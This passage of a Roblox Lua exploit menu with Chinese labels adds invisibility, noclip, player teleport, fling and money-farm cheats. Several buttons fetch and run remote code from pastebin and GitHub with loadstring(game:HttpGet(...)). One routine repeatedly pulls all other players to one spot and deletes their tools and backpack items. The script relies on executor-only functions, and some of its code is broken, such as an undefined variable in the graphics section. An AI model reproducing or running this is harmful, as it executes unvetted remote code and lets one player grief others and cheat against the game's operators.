                    {ImageColor3 = Color3.fromRGB(200, 200, 200)}
                ):Play()
                game:GetService("TweenService"):Create(Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 2, 0, 2)}):Play(

                )
                wait(0.25)
                debounce = false
                toggled = false

                game.Players.LocalPlayer.Character.Humanoid.Health = 0
            elseif toggled == false then
                debounce = true
                game:GetService("TweenService"):Create(
                    Toggle,
                    TweenInfo.new(0.25),
                    {ImageColor3 = Color3.fromRGB(64, 200, 114)}
                ):Play()
                game:GetService("TweenService"):Create(
                    Circle,
                    TweenInfo.new(0.25),
                    {Position = UDim2.new(1, -20, 0, 2)}
                ):Play()
                wait(0.25)
                debounce = false
                toggled = true
                for i, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                    if v.Name == "Root" or v.Name == "RootJoint" then
                        v:Destroy()
                    end
                end
            end
        end
    end
)

Circle.Name = "Circle"
Circle.Parent = Toggle
Circle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Circle.BackgroundTransparency = 1.000
Circle.Position = UDim2.new(0, 2, 0, 2)
Circle.Size = UDim2.new(0, 18, 0, 18)
Circle.Image = "rbxassetid://3570695787"
Circle.ScaleType = Enum.ScaleType.Slice
Circle.SliceCenter = Rect.new(100, 100, 100, 100)
Circle.SliceScale = 0.120

InvisText.Name = "InvisText"
InvisText.Parent = Main
InvisText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InvisText.BackgroundTransparency = 1.000
InvisText.BorderColor3 = Color3.fromRGB(27, 42, 53)
InvisText.BorderSizePixel = 0
InvisText.Position = UDim2.new(0.0967741907, 0, 0, 0)
InvisText.Size = UDim2.new(0, 200, 0, 50)
InvisText.Font = Enum.Font.SourceSans
InvisText.Text = "通用隐身(出体)"
InvisText.TextColor3 = Color3.fromRGB(255, 255, 255)
InvisText.TextScaled = true
InvisText.TextSize = 14.000
InvisText.TextTransparency = 0.140
InvisText.TextWrapped = true

Credits.Name = "Credits"
Credits.Parent = Main
Credits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Credits.BackgroundTransparency = 1.000
Credits.BorderColor3 = Color3.fromRGB(27, 42, 53)
Credits.BorderSizePixel = 0
Credits.Position = UDim2.new(0.0241935477, 0, 0.738317728, 0)
Credits.Size = UDim2.new(0, 94, 0, 18)
Credits.Font = Enum.Font.SourceSans
Credits.Text = "Bebo Mods汉化组"
Credits.TextColor3 = Color3.fromRGB(255, 255, 255)
Credits.TextScaled = true
Credits.TextSize = 14.000
Credits.TextTransparency = 0.250
Credits.TextWrapped = true

-- Scripts:

local UserInputService = game:GetService("UserInputService")
local runService = (game:GetService("RunService"))

local gui = Main

local dragging
local dragInput
local dragStart
local startPos

function Lerp(a, b, m)
    return a + (b - a) * m
end

local lastMousePos
local lastGoalPos
local DRAG_SPEED = (8) -- // The speed of the UI darg.
function Update(dt)
    if not (startPos) then
        return
    end
    if not (dragging) and (lastGoalPos) then
        gui.Position =
            UDim2.new(
            startPos.X.Scale,
            Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED),
            startPos.Y.Scale,
            Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED)
        )
        return
    end

    local delta = (lastMousePos - UserInputService:GetMouseLocation())
    local xGoal = (startPos.X.Offset - delta.X)
    local yGoal = (startPos.Y.Offset - delta.Y)
    lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
    gui.Position =
        UDim2.new(
        startPos.X.Scale,
        Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED),
        startPos.Y.Scale,
        Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED)
    )
end

gui.InputBegan:Connect(
    function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = gui.Position
            lastMousePos = UserInputService:GetMouseLocation()

            input.Changed:Connect(
                function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragging = false
                    end
                end
            )
        end
    end
)

gui.InputChanged:Connect(
    function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end
)

runService.Heartbeat:Connect(Update)

  	end    

})

Tab:AddButton({

	Name = "碰撞体积",

	Callback = function()

     loadstring(game:HttpGet('https://pastebin.com/raw/JYFXjEVh'))()

  	end    

})

Tab:AddButton({

	Name = "人物穿墙",

	Callback = function()

     local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local Noclip = Instance.new("ScreenGui")
local BG = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Toggle = Instance.new("TextButton")
local StatusPF = Instance.new("TextLabel")
local Status = Instance.new("TextLabel")
local Credit = Instance.new("TextLabel")
local Plr = Players.LocalPlayer
local Clipon = false

Noclip.Name = "Noclip"
Noclip.Parent = game.CoreGui

BG.Name = "BG"
BG.Parent = Noclip
BG.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
BG.BorderColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
BG.BorderSizePixel = 2
BG.Position = UDim2.new(0.149479166, 0, 0.82087779, 0)
BG.Size = UDim2.new(0, 210, 0, 127)
BG.Active = true
BG.Draggable = true

Title.Name = "Title"
Title.Parent = BG
Title.BackgroundColor3 = Color3.new(0.266667, 0.00392157, 0.627451)
Title.BorderColor3 = Color3.new(0.180392, 0, 0.431373)
Title.BorderSizePixel = 2
Title.Size = UDim2.new(0, 210, 0, 33)
Title.Font = Enum.Font.Highway
Title.Text = "Noclip"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.FontSize = Enum.FontSize.Size32
Title.TextSize = 30
Title.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Title.TextStrokeTransparency = 0

Toggle.Parent = BG
Toggle.BackgroundColor3 = Color3.new(0.266667, 0.00392157, 0.627451)
Toggle.BorderColor3 = Color3.new(0.180392, 0, 0.431373)
Toggle.BorderSizePixel = 2
Toggle.Position = UDim2.new(0.152380958, 0, 0.374192119, 0)
Toggle.Size = UDim2.new(0, 146, 0, 36)
Toggle.Font = Enum.Font.Highway
Toggle.FontSize = Enum.FontSize.Size28
Toggle.Text = "Toggle"
Toggle.TextColor3 = Color3.new(1, 1, 1)
Toggle.TextSize = 25
Toggle.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Toggle.TextStrokeTransparency = 0

StatusPF.Name = "StatusPF"
StatusPF.Parent = BG
StatusPF.BackgroundColor3 = Color3.new(1, 1, 1)
StatusPF.BackgroundTransparency = 1
StatusPF.Position = UDim2.new(0.314285725, 0, 0.708661377, 0)
StatusPF.Size = UDim2.new(0, 56, 0, 20)
StatusPF.Font = Enum.Font.Highway
StatusPF.FontSize = Enum.FontSize.Size24
StatusPF.Text = "Status:"
StatusPF.TextColor3 = Color3.new(1, 1, 1)
StatusPF.TextSize = 20
StatusPF.TextStrokeColor3 = Color3.new(0.333333, 0.333333, 0.333333)
StatusPF.TextStrokeTransparency = 0
StatusPF.TextWrapped = true

Status.Name = "Status"
Status.Parent = BG
Status.BackgroundColor3 = Color3.new(1, 1, 1)
Status.BackgroundTransparency = 1
Status.Position = UDim2.new(0.580952346, 0, 0.708661377, 0)
Status.Size = UDim2.new(0, 56, 0, 20)
Status.Font = Enum.Font.Highway
Status.FontSize = Enum.FontSize.Size14
Status.Text = "off"
Status.TextColor3 = Color3.new(0.666667, 0, 0)
Status.TextScaled = true
Status.TextSize = 14
Status.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Status.TextWrapped = true
Status.TextXAlignment = Enum.TextXAlignment.Left

Credit.Name = "Credit"
Credit.Parent = BG
Credit.BackgroundColor3 = Color3.new(1, 1, 1)
Credit.BackgroundTransparency = 1
Credit.Position = UDim2.new(0.195238099, 0, 0.866141737, 0)
Credit.Size = UDim2.new(0, 128, 0, 17)
Credit.Font = Enum.Font.SourceSans
Credit.FontSize = Enum.FontSize.Size18
Credit.Text = "Created by KingLuna"
Credit.TextColor3 = Color3.new(1, 1, 1)
Credit.TextSize = 16
Credit.TextStrokeColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Credit.TextStrokeTransparency = 0
Credit.TextWrapped = true

Toggle.MouseButton1Click:connect(function()
	if Status.Text == "off" then
		Clipon = true
		Status.Text = "on"
		Status.TextColor3 = Color3.new(0,185,0)
		Stepped = game:GetService("RunService").Stepped:Connect(function()
			if not Clipon == false then
				for a, b in pairs(Workspace:GetChildren()) do
                if b.Name == Plr.Name then
                for i, v in pairs(Workspace[Plr.Name]:GetChildren()) do
                if v:IsA("BasePart") then
                v.CanCollide = false
                end end end end
			else
				Stepped:Disconnect()
			end
		end)
	elseif Status.Text == "on" then
		Clipon = false
		Status.Text = "off"
		Status.TextColor3 = Color3.new(170,0,0)
	end
end)

  	end    

})

Tab:AddButton({

	Name = "发射核弹[安慰]",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/2172098228q/14/refs/heads/main/%E6%A0%B8%E5%AF%BC%E5%BC%B9%E9%95%BF%E8%BE%BE5000%E5%A4%9A%E6%95%B0%E6%8D%AE%E8%83%BD%E8%AE%A9%E4%BD%A0%E6%94%BE%E4%B8%80%E4%B8%AA%E6%A0%B8%E5%BC%B9.txt"))()

  	end    

})

Tab:AddButton({

	Name = "传送玩家",

	Callback = function()

     loadstring(game:HttpGet('https://raw.githubusercontent.com/Infinity2346/Tect-Menu/main/Teleport%20Gui.lua'))()

  	end    

})

Tab:AddButton({

	Name = "位置吸人",

	Callback = function()

     --[[
Subscribe to Zaptosis
--]]

local L_1_ = true;
local L_2_ = game.Players.LocalPlayer.Character.HumanoidRootPart;
local L_3_ = L_2_.Position - Vector3.new(5, 0, 0)

game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(L_4_arg1)
	if L_4_arg1 == 'f' then
		L_1_ = not L_1_
	end;
	if L_4_arg1 == 'r' then
		L_2_ = game.Players.LocalPlayer.Character.HumanoidRootPart;
		L_3_ = L_2_.Position - Vector3.new(5, 0, 0)
	end
end)

for L_5_forvar1, L_6_forvar2 in pairs(game.Players:GetPlayers()) do
	if L_6_forvar2 == game.Players.LocalPlayer then
	else
		local L_7_ = coroutine.create(function()
			game:GetService('RunService').RenderStepped:Connect(function()
				local L_8_, L_9_ = pcall(function()
					local L_10_ = L_6_forvar2.Character;
					if L_10_ then
						if L_10_:FindFirstChild("HumanoidRootPart") then
							if L_1_ then
								L_6_forvar2.Backpack:ClearAllChildren()
								for L_11_forvar1, L_12_forvar2 in pairs(L_10_:GetChildren()) do
									if L_12_forvar2:IsA("Tool") then
										L_12_forvar2:Destroy()
									end
								end;
								L_10_.HumanoidRootPart.CFrame = CFrame.new(L_3_)
							end
						end
					end
				end)
				if L_8_ then
				else
					warn("Unnormal error: "..L_9_)
				end
			end)
		end)
		coroutine.resume(L_7_)
	end
end;

game.Players.PlayerAdded:Connect(function(L_13_arg1)   
	if L_13_arg1 == game.Players.LocalPlayer then
	else
		local L_14_ = coroutine.create(function()
			game:GetService('RunService').RenderStepped:Connect(function()
				local L_15_, L_16_ = pcall(function()
					local L_17_ = L_13_arg1.Character;
					if L_17_ then
						if L_17_:FindFirstChild("HumanoidRootPart") then
							if L_1_ then
								L_13_arg1.Backpack:ClearAllChildren()
								for L_18_forvar1, L_19_forvar2 in pairs(L_17_:GetChildren()) do
									if L_19_forvar2:IsA("Tool") then
										L_19_forvar2:Destroy()
									end
								end;
								L_17_.HumanoidRootPart.CFrame = CFrame.new(L_3_)
							end
						end
					end
				end)
				if L_15_ then
				else
					warn("Unnormal error: "..L_16_)
				end
			end)
		end)
		coroutine.resume(L_14_)
	end           
end)

  	end    

})

Tab:AddButton({

	Name = "唐县刷钱",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/ok/tang%20county%20script"))()

  	end    

})

Tab:AddButton({

	Name = "2023颁奖典礼画质提升",

	Callback = function()

     local light = game.Lighting
for i, v in pairs(light:GetChildren()) do
	v:Destroy()
end

local ter = workspace.Terrain
local color = Instance.new("ColorCorrectionEffect")
local bloom = Instance.new("BloomEffect")
local sun = Instance.new("SunRaysEffect")
local blur = Instance.new("BlurEffect")

color.Parent = light
bloom.Parent = light
sun.Parent = light
blur.Parent = light

-- enable or disable shit

local config = {

	Terrain = true;
	ColorCorrection = true;
	Sun = true;
	Lighting = true;
	BloomEffect = true;
	
}

-- settings {

color.Enabled = false
color.Contrast = 0.15
color.Brightness = 0.1
color.Saturation = 0.25
color.TintColor = Color3.fromRGB(255, 222, 211)

bloom.Enabled = false
bloom.Intensity = 0.1

sun.Enabled = false
sun.Intensity = 0.2
sun.Spread = 1

bloom.Enabled = false
bloom.Intensity = 0.05
bloom.Size = 32
bloom.Threshold = 1

blur.Enabled = false
blur.Size = 6

-- settings }


if config.ColorCorrection then
	color.Enabled = true
end


if config.Sun then
	sun.Enabled = true
end


if config.Terrain then
	-- settings {
	ter.WaterWaveSize = 0.1
	ter.WaterWaveSpeed = 22
	ter.WaterTransparency = 0.9
	ter.WaterReflectance = 0.05
	-- settings }
end
if config.Lighting then
	-- settings {
	light.Ambient = Color3.fromRGB(0, 0, 0)
	light.Brightness = 4
	light.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
	light.ColorShift_Top = Color3.fromRGB(0, 0, 0)
	light.ExposureCompensation = 0
	light.FogColor = Color3.fromRGB(132, 132, 132)
	light.GlobalShadows = true
	light.OutdoorAmbient = Color3.fromRGB(112, 117, 128)
	light.Outlines = false
	-- settings }
end
local a = game.Lighting
a.Ambient = Color3.fromRGB(33, 33, 33)
a.Brightness = 5.69
a.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
a.ColorShift_Top = Color3.fromRGB(255, 247, 237)
a.EnvironmentDiffuseScale = 0.105
a.EnvironmentSpecularScale = 0.522
a.GlobalShadows = true
a.OutdoorAmbient = Color3.fromRGB(51, 54, 67)
a.ShadowSoftness = 0.18
a.GeographicLatitude = -15.525
a.ExposureCompensation = 0.75
b.Enabled = true
b.Intensity = 0.99
b.Size = 9999 
b.Threshold = 0
local c = Instance.new("ColorCorrectionEffect", a)
c.Brightness = 0.015
c.Contrast = 0.25
c.Enabled = true
c.Saturation = 0.2
c.TintColor = Color3.fromRGB(217, 145, 57)
if getgenv().mode == "Summer" then
   c.TintColor = Color3.fromRGB(255, 220, 148)
elseif getgenv().mode == "Autumn" then
   c.TintColor = Color3.fromRGB(217, 145, 57)
else
   warn("No mode selected!")
   print("Please select a mode")
   b:Destroy()
   c:Destroy()
end
local d = Instance.new("DepthOfFieldEffect", a)
d.Enabled = true
d.FarIntensity = 0.077
d.FocusDistance = 21.54
d.InFocusRadius = 20.77
d.NearIntensity = 0.277
local e = Instance.new("ColorCorrectionEffect", a)
e.Brightness = 0
e.Contrast = -0.07
e.Saturation = 0
e.Enabled = true
e.TintColor = Color3.fromRGB(255, 247, 239)
local e2 = Instance.new("ColorCorrectionEffect", a)
e2.Brightness = 0.2
e2.Contrast = 0.45
e2.Saturation = -0.1
e2.Enabled = true
e2.TintColor = Color3.fromRGB(255, 255, 255)
local s = Instance.new("SunRaysEffect", a)
s.Enabled = true
s.Intensity = 0.01
s.Spread = 0.146

print("Best Graphics loaded! Created by Roblox")

  	end    

})

Tab:AddButton({

	Name = "飞檐走壁",

	Callback = function()

     loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()

  	end    

})

Tab:AddButton({

	Name = "人物失控",

	Callback = function()

     
--MADE BY Redmoon--
--Items:
clickfling = true -- set this to false if u dont want click fling or use torso fling

function rmesh(a)
if not (workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('Mesh') or workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('SpecialMesh')) then return end
old=game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character=workspace[game.Players.LocalPlayer.Name]
for i,v in next, workspace[game.Players.LocalPlayer.Name]:FindFirstChild(a).Handle:GetDescendants() do
if v:IsA('Mesh') or v:IsA('SpecialMesh') then
v:Remove()
end
end
for i = 1 , 2 do
game.Players.LocalPlayer.Character=old
end
end

a=game.Players.LocalPlayer b=game.Players.LocalPlayer.Character c={}d=table.insert e=false for D,E in next,game:GetService("Players").LocalPlayer.Character:GetDescendants()do if E:IsA("BasePart")then d(c,game:GetService("RunService").Heartbeat:connect(function()pcall(function()E.Velocity=Vector3.new(-30,0,0)sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",math.huge)sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",999999999)game.Players.LocalPlayer.ReplicationFocus=workspace end)end))end end function f(D,E,F)game.StarterGui:SetCore("SendNotification",{Title=D;Text=E;Duration=F or 5;})end local x=game:GetService("RunService")g=Instance.new('Folder',b)g.Name='CWExtra'b.Archivable=true local y=b:Clone()y.Name='NexoPD'for D,E in next,y:GetDescendants()do if E:IsA('BasePart')or E:IsA('Decal')then E.Transparency=1 end end h=5.65 a.Character=nil a.Character=b b.Humanoid.AutoRotate=false b.Humanoid.WalkSpeed=0 b.Humanoid.JumpPower=0 b.Torso.Anchored=true f('Nexo','Reanimating...\nPlease wait '..h..' seconds.')wait(h)b.Torso.Anchored=false f('Nexo','Reanimated..')b.Humanoid.Health=0 y.Animate.Disabled=true y.Parent=g y.HumanoidRootPart.CFrame=b.HumanoidRootPart.CFrame*CFrame.new(0,5,0)function i(D,E,F,G)Instance.new("Attachment",D)Instance.new("AlignPosition",D)Instance.new("AlignOrientation",D)Instance.new("Attachment",E)D.Attachment.Name=D.Name E.Attachment.Name=D.Name D.AlignPosition.Attachment0=D[D.Name]D.AlignOrientation.Attachment0=D[D.Name]D.AlignPosition.Attachment1=E[D.Name]D.AlignOrientation.Attachment1=E[D.Name]E[D.Name].Position=F or Vector3.new()D[D.Name].Orientation=G or Vector3.new()D.AlignPosition.MaxForce=999999999 D.AlignPosition.MaxVelocity=math.huge D.AlignPosition.ReactionForceEnabled=false D.AlignPosition.Responsiveness=math.huge D.AlignOrientation.Responsiveness=math.huge D.AlignPosition.RigidityEnabled=false D.AlignOrientation.MaxTorque=999999999 D.Massless=true end function j(D,E,F)Instance.new("Attachment",D)Instance.new("AlignPosition",D)Instance.new("Attachment",E)D.Attachment.Name=D.Name E.Attachment.Name=D.Name D.AlignPosition.Attachment0=D[D.Name]D.AlignPosition.Attachment1=E[D.Name]E[D.Name].Position=F or Vector3.new()D.AlignPosition.MaxForce=999999999 D.AlignPosition.MaxVelocity=math.huge D.AlignPosition.ReactionForceEnabled=false D.AlignPosition.Responsiveness=math.huge D.Massless=true end for D,E in next,b:GetDescendants()do if E:IsA('BasePart')then d(c,x.RenderStepped:Connect(function()E.CanCollide=false end))end end for D,E in next,b:GetDescendants()do if E:IsA('BasePart')then d(c,x.Stepped:Connect(function()E.CanCollide=false end))end end for D,E in next,y:GetDescendants()do if E:IsA('BasePart')then d(c,x.RenderStepped:Connect(function()E.CanCollide=false end))end end for D,E in next,y:GetDescendants()do if E:IsA('BasePart')then d(c,x.Stepped:Connect(function()E.CanCollide=false end))end end for D,E in next,b:GetDescendants()do if E:IsA('Accessory')then i(E.Handle,y[E.Name].Handle)end end i(b['Head'],y['Head'])i(b['Torso'],y['Torso'])j(b['HumanoidRootPart'],y['Torso'],Vector3.new(0,0,0))i(b['Right Arm'],y['Right Arm'])i(b['Left Arm'],y['Left Arm'])i(b['Right Leg'],y['Right Leg'])i(b['Left Leg'],y['Left Leg'])k=a:GetMouse()local z=Instance.new("Part",g)z.CanCollide=false z.Transparency=1 d(c,x.RenderStepped:Connect(function()local D=workspace.CurrentCamera.CFrame.lookVector local E=y["HumanoidRootPart"]z.Position=E.Position z.CFrame=CFrame.new(z.Position,Vector3.new(D.X*10000,D.Y,D.Z*10000))end))l=false m=false n=false o=false p=false function q(D)r=Instance.new('BodyAngularVelocity',D)r.AngularVelocity=Vector3.new(9e9,9e9,9e9)r.MaxTorque=Vector3.new(9e9,9e9,9e9)end q(b.HumanoidRootPart)k=a:GetMouse()s=Instance.new('BodyPosition',b.HumanoidRootPart)s.P=9e9 s.D=9e9 s.MaxForce=Vector3.new(99999,99999,99999)local A d(c,x.Heartbeat:Connect(function()if A==true then s.Position=k.Hit.p b.HumanoidRootPart.Position=k.Hit.p else s.Position=y.Torso.Position b.HumanoidRootPart.Position=y.Torso.Position end end))local B=Instance.new("SelectionBox")B.Adornee=b.HumanoidRootPart B.LineThickness=0.02 B.Color3=Color3.fromRGB(250,0,0)B.Parent=b.HumanoidRootPart B.Name="RAINBOW"t=B if clickfling then d(c,k.Button1Down:Connect(function()A=true end))d(c,k.Button1Up:Connect(function()A=false end))end d(c,k.KeyDown:Connect(function(D)if D==' 'then p=true end if D=='w'then l=true end if D=='s'then m=true end if D=='a'then n=true end if D=='d'then o=true end end))d(c,k.KeyUp:Connect(function(D)if D==' 'then p=false end if D=='w'then l=false end if D=='s'then m=false end if D=='a'then n=false end if D=='d'then o=false end end))local function C(D,E,F)z.CFrame=z.CFrame*CFrame.new(-D,E,-F)y.Humanoid.WalkToPoint=z.Position end d(c,x.RenderStepped:Connect(function()if l==true then C(0,0,1e4)end if m==true then C(0,0,-1e4)end if n==true then C(1e4,0,0)end if o==true then C(-1e4,0,0)end if p==true then y.Humanoid.Jump=true end if l~=true and n~=true and m~=true and o~=true then y.Humanoid.WalkToPoint=y.HumanoidRootPart.Position end end))workspace.CurrentCamera.CameraSubject=y.Humanoid u=Instance.new('BindableEvent')d(c,u.Event:Connect(function()y:Destroy()e=true v=false for D,E in next,b:GetDescendants()do if E:IsA('BasePart')then E.Anchored=true end end w=b.Humanoid:Clone()b.Humanoid:Destroy()w.Parent=b game.Players:Chat('-re')for D,E in pairs(c)do E:Disconnect()end game:GetService("StarterGui"):SetCore("ResetButtonCallback",true)u:Remove()end))game:GetService("StarterGui"):SetCore("ResetButtonCallback",u)

IT = Instance.new
CF = CFrame.new
VT = Vector3.new
RAD = math.rad
C3 = Color3.new
UD2 = UDim2.new
BRICKC = BrickColor.new
ANGLES = CFrame.Angles
EULER = CFrame.fromEulerAnglesXYZ
COS = math.cos
ACOS = math.acos
SIN = math.sin
ASIN = math.asin
ABS = math.abs
MRANDOM = math.random
FLOOR = math.floor

speed = 1
sine = 1
srv = game:GetService('RunService')

reanim = workspace.Camera.CameraSubject.Parent

function hat(h,p,c1,c0,m)
reanim[h].Handle.AccessoryWeld.Part1=reanim[p]
reanim[h].Handle.AccessoryWeld.C1=c1 or CFrame.new()
reanim[h].Handle.AccessoryWeld.C0=reanim[h].Handle.AccessoryWeld.C0:Lerp(c0 or CFrame.new(),1)
if m == true then
rmesh(h)
end
end

m=game.Players.LocalPlayer:GetMouse()
RJ = reanim.HumanoidRootPart.RootJoint
RS = reanim.Torso['Right Shoulder']
LS = reanim.Torso['Left Shoulder']
RH = reanim.Torso['Right Hip']
LH = reanim.Torso['Left Hip']
Root = reanim.HumanoidRootPart
NECK = reanim.Torso.Neck
NECK.C0 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
NECK.C1 = CF(0,-0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C1 = CF(0,-1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))

Mode='1'

mousechanger=game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(k)
if k == '1' then-- first mode
Mode='1'
elseif k == 'e' then-- second mode
Mode='2'
elseif k == 'q' then-- first mode again
Mode='1'
end
end)

attacklol=game.Players.LocalPlayer:GetMouse().Button1Down:Connect(function()
Mode='Attack1'
wait(1) -- time of attack u can edit this
Mode='Attack2'
wait(1)
Mode='Attack3'
wait(0.07)
Mode ='1' -- change this mode to whatever u want the mode to be after attacking
end)

coroutine.wrap(function()
while true do -- anim changer
if HumanDied then break end
sine = sine + speed
local rlegray = Ray.new(reanim["Right Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local rlegpart, rlegendPoint = workspace:FindPartOnRay(rlegray, char)
local llegray = Ray.new(reanim["Left Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local llegpart, llegendPoint = workspace:FindPartOnRay(llegray, char)
local rightvector = (Root.Velocity * Root.CFrame.rightVector).X + (Root.Velocity * Root.CFrame.rightVector).Z
local lookvector = (Root.Velocity * Root.CFrame.lookVector).X + (Root.Velocity * Root.CFrame.lookVector).Z
if lookvector > reanim.Humanoid.WalkSpeed then
lookvector = reanim.Humanoid.WalkSpeed
end
if lookvector < -reanim.Humanoid.WalkSpeed then
lookvector = -reanim.Humanoid.WalkSpeed
end
if rightvector > reanim.Humanoid.WalkSpeed then
rightvector = reanim.Humanoid.WalkSpeed
end
if rightvector < -reanim.Humanoid.WalkSpeed then
rightvector = -reanim.Humanoid.WalkSpeed
end
local lookvel = lookvector / reanim.Humanoid.WalkSpeed
local rightvel = rightvector / reanim.Humanoid.WalkSpeed
if Mode == '1' then
if Root.Velocity.y > 1 then -- jump

elseif Root.Velocity.y < -1 then -- fall

elseif Root.Velocity.Magnitude < 2 then -- idle
hat('Nike Shoebox Costume','Right Arm',CFrame.new(0,0,0),CFrame.new(-0.14+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),7.92+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(36.15+0*math["cos"](sine/10))),true)
hat('VANS_Umbrella','Right Arm',CFrame.new(0,0,0),CFrame.new(-0.14+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),7.92+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(36.15+0*math["cos"](sine/10))),true)
hat('MeshPartAccessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),5.23+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Vector Arrow','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),4.15+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('TwitterBird','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),3.08+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Nebula Blade','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),2.54+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('bloxcxy','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),2+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Slime1Accessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),1.47+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Robloxclassicred','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),0.39+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
